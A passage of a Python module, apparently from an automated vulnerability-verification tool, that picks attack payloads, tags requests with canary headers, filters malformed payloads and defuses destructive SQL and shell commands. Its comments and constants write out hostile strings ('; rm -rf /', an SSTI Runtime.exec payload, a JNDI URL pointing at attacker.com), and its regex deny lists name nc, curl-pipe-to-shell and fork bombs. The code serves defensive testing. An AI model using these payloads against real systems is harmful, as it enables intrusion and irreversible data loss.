"""D1 真实攻击上下文：把 A2 构造的攻击载荷与账户上下文随 TriggerSpec 登记。


1. payload 构造是 A2 的职责，D1 只负责投放。
   D1 绝不硬编码任何探测串 —— `' OR 1=1--`、`{{7*7}}` 这类是「最小威力探测」，
   不是「实打实攻击」，把它们写进 D1 等于把攻击能力降格为可达性探针。
   A2 产不出真实 payload 时，D1 显式退化为「只发 canary 探针」并标记 degraded，
   由 I2 按弱证据处理，绝不伪装成已攻击。

2. canary 走请求头（X-SASTAI-Trace），只服务 I1 的「流量是否按预期流动」监听。
   与参数位 payload 形态完全解耦 —— payload 后续加绕过、变形、编码、混淆，
   都不影响 I1 的请求级关联（I1 匹配的是头里的身份段，不是 payload 的值）。

3. 业务逻辑漏洞是身份问题而非污点问题，不走 canary 通道。
   越权/竞态/状态机绕过依赖「攻击者账户访问受害者资源」的差分，
   canary 追踪对此无能为力，必须走 business_logic.verify 的双账户差分重放。
"""

from __future__ import annotations

import base64
import logging
import os
import re
from typing import Any, Dict, List, Optional

from src.core.exploit_spec import canonical_business_logic_family, DIFFERENTIAL_PROOF_FAMILIES

logger = logging.getLogger(__name__)

# 请求头名：canary 身份段由此携带，探针透传回事件 traceId 做请求级关联。
# 复用既有 X-SASTAI-Trace（探针已支持回传），不新开头，避免探针侧改造。
#
# canary token 唯一性（权威定义见 src/iast/canary.py，二者必须一致）：
#   - spec / trigger_specs 里的字段名是 `taint_marker`；iast_events 表里列名是 `canary`；
#     两者存储的是【同一个完整 canary 串】，由 CanaryFactory.build 生成：
#       身份段 identity = "s4st41" + 16 位十六进制（secrets.token_hex，≈64bit 熵，全局唯一）
#                     + 可选 4 位 run_nonce（使同任务同次登记周期的 spec 共享命名空间，
#                       与该任务其他次运行/其他任务天然不相交，杜绝陈旧 canary 串扰）
#       元字符段 metacharacter = 按 family 定形（$(id)/../ 等）+ 8 位随机指纹
#       身份段置前（探针 maxSampleLength=512 截断尾部），确保身份段不丢。
#   - `canary_identity` = 身份段本身（"s4st41"+16hex，22 字符），仅用于展示与粗粒度关联；
#     `CanaryMatcher.find_identity` 用正则 s4st41[0-9a-fA-F]{16} 从任意事件文本抽取。
#   - 注入：D1 重放把 taint_marker（≡canary）写入本 TRACE_HEADER 头（见 d1_service.replay*）。
#   命名收敛：代码内部统一称完整值为 `canary`；spec 落库字段保留 `taint_marker`，含义≡canary。
TRACE_HEADER = "X-SASTAI-Trace"

# 业务逻辑族（D1 路由用 category 白名单）：真源见 src/core/exploit_spec.py 的
# 此处直接引用规范集；旧 category 写法（vertical / cross_business / statemachine 等）经
# canonical_business_logic_family 归一后映射到规范 token，无需在此重复列举。
BUSINESS_LOGIC_CATEGORIES = frozenset(DIFFERENTIAL_PROOF_FAMILIES)

# A2 产出的占位串（表示「没造出真 payload」），不能当攻击载荷投放。
_PLACEHOLDER_PAYLOADS = frozenset({
    "base64(serialized_object)",
    "webshell_or_probe_file",
    "alternate_owner_resource_id",
    "generic_payload",
    "",
})

# family → 业务逻辑 category 归一（A2 的 family 命名与业务族不完全一致）。
_FAMILY_TO_CATEGORY = {
    "idor": "bola",
    "bola": "bola",
    "race-condition": "race",
    "race_condition": "race",
    "workflow-bypass": "state_machine",
    "privilege-escalation": "vertical_privesc",
    "business-logic": "bola",
}


def normalize_category(family: str, exploit_spec: Optional[Dict[str, Any]] = None,
                       vuln_dict: Optional[Dict[str, Any]] = None) -> str:
    """把 A2 的 family / exploit_spec / 漏洞文本归一为稳定 category。

    category 决定 D1 的路由：业务逻辑族走双账户差分，其余走「头 canary + 参数真实 payload」。
    归一失败（无法判定）时返回空串，调用方按「普通漏洞」处理——绝不猜成业务族，
    否则会把本该真打的普通漏洞错误地送进差分通道而拿不到账户。
    """
    fam = str(family or "").strip().lower()
    if not fam:
        fam = str(((exploit_spec or {}).get("payload") or {}).get("payload_family") or "").strip().lower()

    if fam in _FAMILY_TO_CATEGORY:
        return _FAMILY_TO_CATEGORY[fam]
    if fam in BUSINESS_LOGIC_CATEGORIES:
        return fam

    # 从漏洞标题/描述里捞业务族关键词（A2 family 标成 generic 时的兜底）。
    blob = ""
    if vuln_dict:
        blob = " ".join(str(vuln_dict.get(k) or "") for k in ("type", "title", "description")).lower()
    if any(tok in blob for tok in ("越权", "未授权访问", "平行权限", "horizontal")):
        return "bola"
    if any(tok in blob for tok in ("垂直越权", "提权", "privilege")):
        return "vertical_privesc"
    if any(tok in blob for tok in ("竞态", "并发", "race")):
        return "race"
    if any(tok in blob for tok in ("优惠券", "金额", "重复提交", "状态机")):
        return "state_machine"
    return ""


def is_business_logic(category: str) -> bool:
    """category 是否属业务逻辑族（走双账户差分而非 canary 污点通道）。
    判定统一走 src/core/exploit_spec.canonical_business_logic_family（单一真相源）。"""
    return canonical_business_logic_family(category) in DIFFERENTIAL_PROOF_FAMILIES


# 需要「双账户（攻击方/受害方）」差分重放的业务族：缺账户时不能落到 canary 攻击路径，
# 必须由 auth bootstrap 取得账户或降级 no_evidence。状态机/计算/认证会话/滥用 DoS 单账户或
# 裸请求即可，不强制双账户（避免对「未授权裸 GET」类发现错误地强制登录）。
# 所有业务逻辑族都需要「已认证上下文」才能真触发重放（竞态/计算/滥用/签名等均需在登录态下打），
# 故把它们全部纳入双账户集：缺账户时按 target.login 真登录取凭据，否则退回 target.auth_context。
# 注入类（SQLi/命令/SSRF 等）不走此集，它们走 canary 污点重放通道。
BUSINESS_LOGIC_DUAL_ACCOUNT = frozenset({
    "bola", "idor",
    "vertical", "vertical_privesc",
    "cross_module", "cross_module_privesc", "cross_business",
    "state_machine", "statemachine",
    "calculation", "calculation_logic",
    "auth_session", "auth", "captcha", "password_reset",
    "abuse_dos", "abuse", "dos",
    "race",
    "signature_bypass", "signature", "jwt_forgery", "jwt", "alg_none",
})


def needs_dual_accounts(category: str) -> bool:
    """category 是否需要双账户差分重放（缺账户必须 bootstrap 或降级，不能走 canary 通道）。"""
    return str(category or "").strip().lower() in BUSINESS_LOGIC_DUAL_ACCOUNT


def select_attack_payloads(exploit_spec: Optional[Dict[str, Any]] = None,
                           family: str = "") -> List[str]:
    """从 A2 的 exploit_spec 里挑「最大威力」的真实攻击 payload。

    优先级：high_impact_payloads > candidate_payloads（A2 已把验证级+高影响合并进去）。
    这是「A2 造弹、D1 投弹」的接缝：本函数只做挑选，绝不在此生成任何 payload。

    返回空列表表示 A2 没造出真 payload —— 调用方必须按 degraded 处理
    （退化为纯 canary 探针），不能拿占位串充数。
    """
    payload = (exploit_spec or {}).get("payload") or {}
    if not isinstance(payload, dict):
        # candidate_payloads），而 A2 per-file spec 里可能是**字符串**。
        # 字符串形态下合成器把候选写在兄弟键 `payload_candidates`，这里兼容读取，
        # 否则「合成了但没人用」会再次发生。
        _direct = str(payload or "").strip()
        _sib = (exploit_spec or {}).get("payload_candidates")
        out: List[str] = []
        if _direct and _direct not in _PLACEHOLDER_PAYLOADS and not _is_ysoserial_text_label(_direct):
            out.append(_direct)
        for item in (_sib or []):
            text = str(item or "").strip()
            if text and text not in _PLACEHOLDER_PAYLOADS and text not in out:
                out.append(text)
        return out

    ordered: List[str] = []
    # 高影响优先：真打就要最大威力，探测串留作验证级证据不在此列。
    for src_key in ("high_impact_payloads", "candidate_payloads"):
        for item in payload.get(src_key) or []:
            text = str(item or "").strip()
            if not text or text in _PLACEHOLDER_PAYLOADS:
                continue
            # 文本标签（如 "ysoserial CommonsCollections6 calc"）：以 ysoserial 开头但本身不是
            # 合法 Java 序列化流，若当真 payload 投出去只是乱码，打不中自定义接线。
            # 跳过 → 让 spec 落到 sca_forge 去造真字节（兜底一致性，评审）。
            if _is_ysoserial_text_label(text):
                continue
            # 让调用方继续走弹药库补位，而不是把废弹原样投出去。
            if classify_payload_family_mismatch(text, family):
                logger.info(
                    "[attack_context] family=%s 的载荷未过族-载荷一致性自检，丢弃（%s）",
                    family, classify_payload_family_mismatch(text, family),
                )
                continue
            if text not in ordered:
                ordered.append(text)
    if ordered:
        return ordered

    # high_impact_ladder 是 {payload: ...} 的渐进结构，取最高一阶。
    ladder = payload.get("high_impact_ladder") or []
    if isinstance(ladder, list) and ladder:
        top = ladder[-1]
        text = ""
        if isinstance(top, dict):
            text = str(top.get("payload") or top.get("value") or "").strip()
        else:
            text = str(top or "").strip()
        if text and text not in _PLACEHOLDER_PAYLOADS:
            return [text]

    logger.debug(
        "[attack_context] family=%s 未产出真实攻击 payload（A2 未构造或仅为占位），"
        "D1 将退化为纯 canary 探针并标记 degraded。", family,
    )
    return []


# ============================================================================
#
#   · SSRF 族的载荷是 `http://127.0.0.1:8080;rm -rf /`、`; rm -rf /` 这类 shell 命令模板
#     （分号后的 shell 片段不参与 SSRF 语义，且 `;` 在 URL 里常被判非法 → 请求直接失败）；
#   · CRLF 族的载荷是 `test1=; rm -rf /` —— CRLF 需要的是 `%0d%0a` 换行序列，命令注入载荷完全无效；
#   · 反序列化族的载荷是 `java.util.HashMap$1@12345678`、`java:com.example.ExploitClass`
#     这类**类名字符串**，既不是序列化字节流也不是 ysoserial 命令串，readObject 只会读到无关对象。
# 这些「废弹」投出去的后果是：A1 检出、A2 契约、D1 投递、I1 采集整条链白跑，而报告显示成
# 「未打通」，看起来像探针或靶场的缺陷——排查方向被彻底带偏。
#
# 设计约束（务必遵守）：
#   1. 只做「禁止项」，不做「必须项」白名单正则。判据过紧会把合法载荷误判为废弹，
#      反而降低投放成功率（这是本改动唯一的风险点）。
#   2. 判废不等于判错漏洞：只丢弃载荷并降级，绝不改动 family / 路由 / spec 本身。
#   3. 判废必须留痕（返回原因串），供对账把「没弹」与「弹形状错」区分开。
# ============================================================================

# shell 元字符：出现在 SSRF / CRLF 载荷里即说明这条弹是命令注入模板串过来的。
_SHELL_METACHAR_RE = re.compile(r";|`|\$\(|&&|\|\|")

# shell 命令词：CRLF 载荷里若没有任何换行标记却出现命令词，即为纯命令注入载荷。
_SHELL_CMD_WORD_RE = re.compile(
    r"\b(rm|cat|id|whoami|calc|wget|curl|nc|ncat|netcat|sh|bash|zsh|echo|ls|pwd|chmod|chown|"
    r"kill|pkill|python[23]?|perl|ruby|telnet|ftp|tftp|mkfifo|nslookup|ping)\b",
    re.IGNORECASE,
)

# CRLF 注入的换行标记（URL 编码态与字面态都要认）。
_CRLF_MARKER_RE = re.compile(r"%0d%0a|%0a%0d|%0d|%0a|%0D%0A|\r|\n", re.IGNORECASE)

# 纯 Java 类名形态：`java.util.HashMap$1`、`java.util.HashMap$1@12345678`、
# `java:com.example.ExploitClass`。反序列化族投这种串等于投了个类名，不是 gadget 链。
# 要求至少一个点分段（避免把 `abcd` 这类短 base64 误判成类名）。
_CLASSNAME_ONLY_RE = re.compile(r"^(?:java:)?[a-zA-Z_$][\w$]*(?:\.[a-zA-Z_$][\w$]*)+(?:@[0-9a-fA-F]+)?$")

#
# ① 赋值语句：`name = expr` / `name := expr` / `obj.prop = expr`
#    —— 表达式引擎求值的是**整个输入**，赋值不是求值（QLExpress 的 /vuln1 读整个
#    request body，`express = '...'` 只是往一个变量里塞字符串，不会被求值）。
_EXPR_ASSIGN_RE = re.compile(
    r"^\s*[A-Za-z_$][\w$]*(?:\s*\.\s*[A-Za-z_$][\w$]*)*\s*(?::=|=(?!=))\s*\S")
# ② 只有副作用、不产生可观测求值结果的语句：`System.out.println(...)` /
#    `print(...)` / `console.log(...)` / `Runtime.getRuntime.exec(...)`
#    —— 判据是「响应里出现求值结果」（如 49），这些语句没有返回值 ⇒ 无从确认。
_EXPR_SIDE_EFFECT_ONLY_RE = re.compile(
    r"^\s*(?:System\.out\.(?:print|println|printf)\s*\(|print\s*\(|print\s+"
    r"|println\s*\(|console\.(?:log|error|warn)\s*\(|"
    r"Runtime\.getRuntime\(\)\.exec\s*\(|ProcessBuilder\s*\()", re.IGNORECASE)

# family → 自检分组（None = 该族不做形状自检，一律放行）。
def _payload_check_group(family: str) -> Optional[str]:
    f = str(family or "").strip().lower()
    if not f:
        return None
    if "ssrf" in f or "server_side_request" in f or "server-side-request" in f:
        return "ssrf"
    if "crlf" in f or "换行" in f:
        return "crlf"
    if "deserial" in f or "unserial" in f or "反序列化" in f:
        return "deserialization"
    # 归组函数唯一来源是 src.core.family_sink_registry.family_group，此处不得另立映射。
    try:
        from src.core.family_sink_registry import family_group as _fam_group

        if _fam_group(f) == "jndi_injection":
            return "jndi"
    except Exception:
        pass
    # 命令/OS 注入族：此前无归组 → family_minimal_payload 返回 None → D1 退化为纯 canary 重放，
    # `;|&` 等），_is_waf_blocked 恒 False → escalate_variant 变体梯子在真实扫描里永不点火
    # 正是 cmdFilter 触发字符）→ 真实扫描即可让 WAF 拦截→escalate，钉死 C 验证。
    if any(k in f for k in ("command", "os_command", "os-exec", "rce", "_exec", "cmdi")):
        return "command_execution"
    # **没有归组** ⇒ 族-载荷一致性自检对它恒放行 ⇒ A2 造的占位载荷会**占住**
    # spec.attack_payloads ⇒ D1 的「载荷为空 → 走弹药库补位」分支永不触发 ⇒
    # 族载荷库（expr_arith：7*7 / #{7*7}）永远不会被调用。
    #
    #   `express = 'System.out.println("Hello, World!");'`
    # —— ① 它是**赋值语句**不是表达式（QLExpress 端点读整个 request body 求值，
    #        参数名根本不叫 express）；② 它只是打印，**不产生可观测的求值结果**
    #        （响应里不会出现 49），判据无从确认。
    # 结果：attempts=0、payload_source=none ⇒ 该真值点恒漏。
    if any(k in f for k in ("expression_injection", "expression", "qlexpress",
                            "spel", "ognl", "mvel", "el_injection")):
        return "expression_injection"
    return None


def classify_payload_family_mismatch(payload: Any, family: Any) -> Optional[str]:
    """族-载荷一致性自检：载荷形状与所属族明显不符时返回废弹原因，通过返回 None。

    只做禁止项（见模块顶部设计约束）。原因串会随重放结果落库，供对账区分
    「A2 没造出弹」与「A2 造了弹但形状错」—— 后者的根因在上游，不该记成运行时打不通。
    """
    group = _payload_check_group(family)
    if not group:
        return None
    text = str(payload or "").strip()
    if not text:
        return None

    if group == "ssrf":
        # SSRF 载荷不需要任何 shell 元字符；出现即说明是命令注入模板串到了 SSRF 位。
        if _SHELL_METACHAR_RE.search(text):
            return "ssrf_payload_with_shell_metachar"
        return None

    if group == "crlf":
        # CRLF 允许带换行标记的任意载荷（含换行 + 命令词的组合）；
        # 但「既无换行标记、又含命令词或元字符」= 纯命令注入载荷，对 CRLF 完全无效。
        if _CRLF_MARKER_RE.search(text):
            return None
        if _SHELL_METACHAR_RE.search(text) or _SHELL_CMD_WORD_RE.search(text):
            return "crlf_payload_without_line_break"
        return None

    if group == "deserialization":
        # 真 gadget 字节流（base64 → AC ED 00 05）恒放行；纯类名字符串一律判废。
        if _looks_like_serialization(text):
            return None
        # 魔数前缀（AC ED 00 05 的 base64 恒为 rO0AB…）：样本可能被截断而解不出完整流，
        # 但前缀本身已证明它是 Java 序列化字节，不得误杀（既有契约 test_real_serialized_bytes_pass）。
        if text.startswith("rO0AB"):
            return None
        if _CLASSNAME_ONLY_RE.match(text):
            return "deserialization_payload_is_class_name"
        # `java:com.sun.rowset.JdbcRowSetImpl;serialization=1;url=http://attacker.com/exploit`
        # 正是这种形态——它占据了 spec 的 attack_payloads，使 D1 的
        # ``if not attack_payloads`` 补位分支永不触发，真 gadget 永远不被构造，
        # 于是 Runtime.exec 永不发生，第三层链路确证拿不到 rce_sink 节点。
        # 反序列化族据此改为**白名单制**：只有真序列化流可投，其余一律判废并落细分原因，
        # 交由 sca_forge（gadget_builder / 弹药库 / ysoserial）补造真字节。
        # 判废只影响「投什么弹」，不改变 family/路由/spec 本身，不产生假阴性。
        if text.lower().startswith("java:") or (";" in text and "=" in text):
            return "deserialization_payload_is_placeholder_declaration"
        return "deserialization_payload_not_serialization_stream"

    if group == "expression_injection":
        # 表达式注入（QLExpress / SpEL / OGNL）：载荷必须是**被求值的表达式**，
        # 且必须产生**可观测的求值结果**（判据 = 响应里出现求值结果，如 49）。
        #
        # `express = 'System.out.println("Hello, World!");'` 被当成合法载荷放行 ⇒
        # 它占住 attack_payloads ⇒ 族载荷库（7*7 / #{7*7}）永不触发 ⇒ 该真值点恒漏。
        #
        # 判废两类：
        #   ① **赋值语句**（`x = ...`）—— 端点求值的是整个 body，赋值不是求值；
        #   ② **只有副作用无返回值**的语句（print/println/console.log 等）
        #      —— 它们不产生可观测的求值结果，判据无从确认。
        # 放行：含运算符/函数调用/字面量回显形态的表达式（含 7*7 这种算术）。
        _t = text
        # ① 赋值语句：`name = expr`（含 Java/Groovy/JS 风格的 = / :=）
        if _EXPR_ASSIGN_RE.match(_t):
            return "expression_payload_is_assignment"
        # ② 纯副作用语句：打印 / 日志 / 赋值链
        if _EXPR_SIDE_EFFECT_ONLY_RE.match(_t):
            return "expression_payload_has_no_observable_result"
        # 其余：算术 / 函数调用 / 字面量等，按表达式放行
        return None

    return None


def filter_payloads_by_family(payloads: List[str], family: Any) -> tuple:
    """按族-载荷一致性自检过滤载荷，返回 ``(保留列表, 废弹原因列表)``。

    废弹原因形如 ``"ssrf_payload_with_shell_metachar"``（不含载荷内容，避免日志泄长串）。
    全部被判废时返回空保留列表 —— 调用方应继续走弹药库补位 / 最小兜底弹，
    而不是把废弹投出去，也不是直接判「该漏洞打不通」。
    """
    kept: List[str] = []
    dropped: List[str] = []
    for p in payloads or []:
        reason = classify_payload_family_mismatch(p, family)
        if reason:
            dropped.append(reason)
            continue
        kept.append(p)
    return kept, dropped


# 每族「最小可用载荷」兜底（评审 ②-1 第二条）：LLM 与弹药库都失败时，保证仍有一发
# 形状正确的弹，使「载荷为空」与「载荷形状错」不再混同。均为无害探针（打本地回环），
# 不含任何破坏性动作 —— 与铁律「绝不发未经验证的破坏性载荷」一致。
_FAMILY_MINIMAL_PAYLOAD = {
    "ssrf": "http://127.0.0.1:8080/",
    "crlf": "%0d%0aX-SastAI-Injected: 1",
    # rmi/jndi_injection/ldapi/ldap_injection 经归组后都取这一发，保证「载荷为空」
    # 不再出现在 jndi 协议族。
    "jndi": "${jndi:ldap://127.0.0.1:1389/sastai-probe}",
    # /codeinject/sec cmdFilter 白名单的拦截字符（命中返回 "Bad boy. I got u."），用于钉死
    # escalate_variant 变体梯子（C 验证）。无 WAF 的真实命令端点则实际执行 id，得到真实 RCE 影响证据。
    "command_execution": ";id",
}


def family_minimal_payload(family: Any) -> Optional[str]:
    """返回该族的最小可用兜底载荷；无兜底的族（含反序列化，由 sca_forge 造真字节）返回 None。"""
    group = _payload_check_group(family)
    return _FAMILY_MINIMAL_PAYLOAD.get(group or "")


def _looks_like_serialization(text: str) -> bool:
    """判断字符串是否是合法的 Java 序列化流（base64 解码后以 AC ED 00 05 开头）。"""
    try:
        from src.iast.payload_forge import PayloadForge
        return bool(PayloadForge.selfcheck(text, "ysoserial"))
    except Exception:
        try:
            raw = base64.b64decode(text, validate=True)
        except Exception:
            return False
        return raw.startswith(b"\xac\xed\x00\x05")


def _is_ysoserial_text_label(text: str) -> bool:
    """判断 A2 产出的是 ysoserial 文本标签而非真字节流。

    文本标签形如 'ysoserial CommonsCollections6 calc'：以 ysoserial 开头，但本身不是合法
    Java 序列化流。这类串若当真 payload 投出去只会是乱码，必须让 sca_forge 去造真字节。
    真 ysoserial base64 字节流会过自检（_looks_like_serialization 为真），不在此列。
    """
    t = (text or "").strip().lower()
    if not t.startswith("ysoserial"):
        return False
    return not _looks_like_serialization(text)


def _selfcheck_or_raise(payloads: List[str]) -> None:
    """自检门（评审第 3 点）：任何要登记为 attack_payload 的生成结果都必须先过 selfcheck，
    不过就直接报错，绝不把废弹（非合法 Java 序列化流）当真弹投出去。

    注意：此处抛错是「显式报错」——调用方（D1 重放）应按 per-spec 捕获后标记 degraded，
    而不是把废弹悄悄当真弹投递。核心目标是「绝不发出未经验证的 payload」。
    """
    from src.iast.payload_forge import PayloadForge
    for p in payloads:
        if not PayloadForge.selfcheck(str(p), "ysoserial"):
            raise RuntimeError(
                f"[attack_context] 生成的 payload 未通过自检（不是合法 Java 序列化流），"
                f"拒绝登记为 attack_payload：{str(p)[:80]}"
            )


def spec_attack_payloads(spec: Optional[Dict[str, Any]] = None) -> List[str]:
    """从 TriggerSpec 取出真实攻击 payload（兼容两种来源形态）。

    - 内存态：spec["attack_payloads"] 是 list。
    - DB 态（load_trigger_specs_by_workspace 的 SELECT *）：spec["attack_payloads_json"] 是 JSON 字符串。
    两种都要支持，否则 D1 在 DB 回放路径上永远读不到 payload 而静默退化为纯探针。
    """
    spec = spec or {}
    raw = spec.get("attack_payloads")
    if isinstance(raw, list):
        return [str(p) for p in raw if str(p or "").strip() and str(p) not in _PLACEHOLDER_PAYLOADS]
    if isinstance(raw, str) and raw.strip():
        try:
            import json as _json
            parsed = _json.loads(raw)
            if isinstance(parsed, list):
                return [str(p) for p in parsed if str(p or "").strip() and str(p) not in _PLACEHOLDER_PAYLOADS]
        except Exception:
            pass
    raw_json = spec.get("attack_payloads_json")
    if isinstance(raw_json, str) and raw_json.strip():
        try:
            import json as _json
            parsed = _json.loads(raw_json)
            if isinstance(parsed, list):
                return [str(p) for p in parsed if str(p or "").strip() and str(p) not in _PLACEHOLDER_PAYLOADS]
        except Exception:
            logger.debug("[attack_context] attack_payloads_json 解析失败，按无 payload 处理")
    return []


# ── 时间盲注承接：sleep 型 payload 的时延解析（D1 计时 + D2 确认门共用的单一真相源）──
#
# 但闭环实时链路只认 IAST sink-reached，从不测响应时延——一旦探针没织到该 sink（或
# sink 在 DB 驱动内部不可织），时间盲注就"发得出、承接不上"，D2 只能判 no_evidence。
# 修法：D1 重放时对同源 payload 计时，D2 增设「时延双阈值确认门」作为 sink-reached 的旁证兜底。
# 计时侧（D1，填 sleep_seconds_hint / baseline_elapsed_ms）与判定侧（D2，双阈值）必须用
# 同一份解析逻辑，否则计时基准与判定门对不齐 → 本模块是二者共用的唯一真相源。
#
# 覆盖方言：MySQL SLEEP/子查询 sleep、PostgreSQL pg_sleep、MSSQL WAITFOR DELAY、
# Oracle dbms_pipe.receive_message、shell sleep N（Oracle 为 M6 补，与 sql_dialect 的造弹成对）。
# 只解析「预期时延秒数」这一件事，绝不在此判定攻击是否成功——成功判定归 D2 的双阈值门。
_SLEEP_PATTERNS = (
    # PostgreSQL: pg_sleep(5) / pg_sleep ( 5 )  —— 先于通用 sleep(...) 匹配，避免被泛化规则误截。
    re.compile(r"\bpg_sleep\s*\(\s*(\d+(?:\.\d+)?)\s*\)", re.IGNORECASE),
    # MySQL / 通用 SQL: SLEEP(5) / sleep ( 5 )  —— 含子查询 SELECT SLEEP(5) 等形态。
    re.compile(r"\bsleep\s*\(\s*(\d+(?:\.\d+)?)\s*\)", re.IGNORECASE),
    # MSSQL: WAITFOR DELAY '0:0:5' —— 取时:分:秒里的秒段。
    re.compile(r"waitfor\s+delay\s+['\"]?\d+:\d+:(\d+(?:\.\d+)?)", re.IGNORECASE),
    # Oracle: dbms_pipe.receive_message('X',5) —— 秒数是第二个参数，不是第一个。
    # M6 补：原先只有上面四条，Oracle 弹造得出来却解析不出秒数 → sleep_seconds_hint=0
    # → D2 时延门不启用 → 弹白投。造弹与解析必须成对补，否则是半个功能。
    re.compile(r"dbms_pipe\.receive_message\s*\(\s*['\"][^'\"]*['\"]\s*,\s*(\d+(?:\.\d+)?)\s*\)",
               re.IGNORECASE),
    # shell 命令注入: sleep 5 / sleep 5; / ; sleep 5 —— 独立命令形态（非 SQL 函数调用）。
    re.compile(r"\bsleep\s+(\d+(?:\.\d+)?)\b", re.IGNORECASE),
)


def parse_sleep_seconds(payload: Any) -> float:
    """从单条 payload 解析「预期时延秒数」；不是 sleep 型 payload 返回 0.0。

    单一真相源：D1 据此判断是否需要采集无害基线 + 填 sleep_seconds_hint，
    D2 据此做时延双阈值确认门。二者必须用同一份解析逻辑，否则计时基准与判定门对不齐。

    多个 sleep 命中时取最大秒数：payload 里可能叠加多个 sleep（子查询/多语句），
    以最长预期时延为准（信噪比最高，最抗抖动）。
    """
    text = str(payload or "")
    if not text:
        return 0.0
    best = 0.0
    for pat in _SLEEP_PATTERNS:
        for m in pat.finditer(text):
            try:
                val = float(m.group(1))
            except (TypeError, ValueError):
                continue
            if val > best:
                best = val
    return best


def first_sleep_payload(payloads: Optional[List[Any]] = None) -> Optional[str]:
    """从 payload 列表挑出「预期时延最长的 sleep 型 payload」；无 sleep 型返回 None。

    D1 用它决定这条 spec 是否属时间盲注类、是否需要额外发一次无害基线请求测 baseline_elapsed_ms。
    取时延最长的一条：多条 sleep 里最长延迟对时延差分最稳健（相对网络抖动信噪比最高）。
    """
    best_text: Optional[str] = None
    best_sec = 0.0
    for item in payloads or []:
        text = str(item or "").strip()
        if not text:
            continue
        sec = parse_sleep_seconds(text)
        if sec > best_sec:
            best_sec = sec
            best_text = text
    return best_text


def neutralize_sleep_payload(payload: Any) -> str:
    """把 sleep 型 payload 的时延秒数改写为 0（结构完全不变），用作时间盲注的无害基线对照。

    SLEEP(5)→SLEEP(0)、pg_sleep(5)→pg_sleep(0)、WAITFOR DELAY '0:0:5'→'0:0:0'、sleep 5→sleep 0。
    经典时间盲注对照：同一结构下 delay=N 与 delay=0 的耗时差，最能隔离 sleep 净效果、
    抗「换个平凡值走到不同代码分支」带来的结构性时延噪声。非 sleep 型原样返回。
    D1 采集 baseline_elapsed_ms 时用它构造对照请求，与 parse_sleep_seconds 共享同一份方言知识。
    """
    text = str(payload or "")
    if not text:
        return text

    def _zero_group(m: "re.Match") -> str:
        full = m.group(0)
        base = m.start(0)
        s0, s1 = m.span(1)  # group(1) 是秒数，绝对坐标 → 转成相对 full 的偏移
        return full[: s0 - base] + "0" + full[s1 - base:]

    out = text
    for pat in _SLEEP_PATTERNS:
        out = pat.sub(_zero_group, out)
    return out


#
# 背景：真实扫描环境不会为靶标 DB 做定时自愈（只有本地靶场有看门狗 + FileDbInitConfig 每次启动
# 补种 schema），破坏性 payload（DROP TABLE / TRUNCATE / 无 WHERE 的 DELETE·UPDATE / ALTER TABLE）
# 一旦在靶标 DB 上真的执行，数据被永久破坏、只能人工回滚，且会污染之后所有轮次的业务逻辑确认
# DROP TABLE t_product ×72、users ×87。
#
# 修法：D1 投放前把破坏性 SQL payload 降级为「语法错误型探针」（默认未闭合单引号 `'`），仍能
# 证明「注入点把攻击者输入送进了 SQL 解析器」（DB 报语法错误 / 5xx 差异 = 注入可达），但绝不
# 修改任何数据。这是「证明力换安全」的自觉取舍：语法错误型证据弱于「数据被毁」的铁证，但它
# 不破坏环境，契合真实扫描场景（人工回滚成本高）。C 方案（本实现）不做 A（定时自愈巡检）。
_DESTRUCTIVE_SQL_PATTERNS = (
    re.compile(r"(?i)\bdrop\s+(?:table|database|schema|index|view|sequence|user|tablespace)\b"),
    re.compile(r"(?i)\btruncate\b"),
    re.compile(r"(?i)\balter\s+table\b"),
    # 无 WHERE 的 DELETE / UPDATE（到语句尾为止没有 where 才算破坏性），负向前瞻判定。
    re.compile(r"(?i)\bdelete\s+from\b(?![^;]*\bwhere\b)"),
    re.compile(r"(?i)\bupdate\s+[\w\"`\.\[\]]+\s+set\b(?![^;]*\bwhere\b)"),
    re.compile(r"(?i)\bshutdown\b"),
)

# 语法错误型探针：未闭合单引号。字符串上下文→SQL 语法错误；数值上下文→类型/语法错误。
# 两种都会让 DB 报错，从而证明输入到达 SQL 解析器，但不改动任何数据。
_SYNTAX_ERROR_PROBE = "'"

#
# `/marketing/preview`（SSTI）产出的 payload 之一就是
#   tpl=[[${T(java.lang.Runtime).getRuntime.exec("rm -rf /")}]]
# 一旦 SSTI 真的生效，靶机/宿主就被删盘（不可逆）。SQL 那一层完全看不见它。
#
# 修法：结构化 payload（exec("...")）只把 exec 的**参数**换成无害探针 whoami（保留 payload
# 结构，SSTI 仍成立、仍能证明注入可达，杀伤力归零）；裸命令 payload（命令注入族）整条换成
# whoami。时间盲注（sleep/ping -c）与读取类（id/whoami/cat /etc/passwd）不是破坏性，不得误伤。
_BENIGN_COMMAND_PROBE = "whoami"

_DESTRUCTIVE_CMD_PATTERNS = (
    re.compile(r"(?i)\brm\s+-[a-z]*[rf]"),                 # rm -rf / rm -f
    re.compile(r"(?i)\bmkfs(\.\w+)?\b"),                   # mkfs.ext4 ...
    re.compile(r"(?i)\bdd\s+[^;|&]*\bof="),                # dd of=/dev/sda
    re.compile(r"(?i)\b(shutdown|reboot|halt|poweroff)\b"),
    re.compile(r"(?i)\bformat\s+[a-z]:"),                  # format c:
    re.compile(r"(?i)\b(del|erase)\s+/[fsq]"),             # del /f /s /q
    re.compile(r"(?i)\brd\s+/s\b|rmdir\s+/s\b"),
    re.compile(r"(?i)>\s*/dev/(sd|hd|nvme|mmcblk)"),       # > /dev/sda
    re.compile(r"(?i)\bdropdb\b|\bmysqladmin\s+shutdown\b"),
    re.compile(r":\s*\(\s*\)\s*\{"),                       # fork bomb :(){ :|:& };:
    re.compile(r"(?i)\b(curl|wget)\b[^|`]*\|\s*(ba|z)?sh\b"),
    re.compile(r"(?i)\bchmod\s+-R\s+0+\b|\bchown\s+-R\b"),
    re.compile(r"(?i)\btruncate\s+-s\s*0\b"),
    re.compile(r"(?i)\bkill(all)?\s+-9\s+1\b"),
    re.compile(r"(?i)\bmv\s+\S+\s+/dev/null\b"),
)

# 结构化 exec 调用：只中和其参数，保留 payload 结构（SSTI/SpEL/反序列化仍可证明可达）。
_EXEC_ARG_RE = re.compile(r"(?P<pre>\bexec\s*)\(\s*(?P<q>[\"'])(?P<arg>.*?)(?P=q)\s*\)", re.IGNORECASE)


def _has_destructive_command(text: str) -> bool:
    """文本里是否含破坏性系统命令（先 URL 解码，防 `%72m` 类编码绕过）。"""
    t = str(text or "")
    if not t:
        return False
    try:
        import urllib.parse as _up
        t = _up.unquote(t)
    except Exception:  # noqa: BLE001
        pass
